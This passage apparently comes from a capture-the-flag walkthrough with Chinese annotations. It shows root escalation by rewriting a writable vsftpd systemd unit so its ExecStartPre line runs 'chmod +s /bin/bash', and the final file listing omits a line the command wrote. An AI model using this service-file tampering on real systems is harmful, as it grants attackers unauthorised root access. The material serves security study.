cat 查看该文件

ExecStartPre 键是服务启动前置执行命令

drac@ide:/tmp$ cat  /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

printf 修改 ExecStartPre=/bin/chmod +s /bin/bash

drac@ide:/tmp$ printf '[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nType=simple\nExecStartPre=/bin/chmod +s /bin/bash\nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\nExecReload=/bin/kill -HUP $MAINPID\n\n[Install]\nWantedBy=multi-user.target\n' > /lib/systemd/system/vsftpd.service
<user.target\n' > /lib/systemd/system/vsftpd.service

drac@ide:/tmp$ cat  /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStartPre=/bin/chmod +s /bin/bash
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf

[Install]
WantedBy=multi-user.target
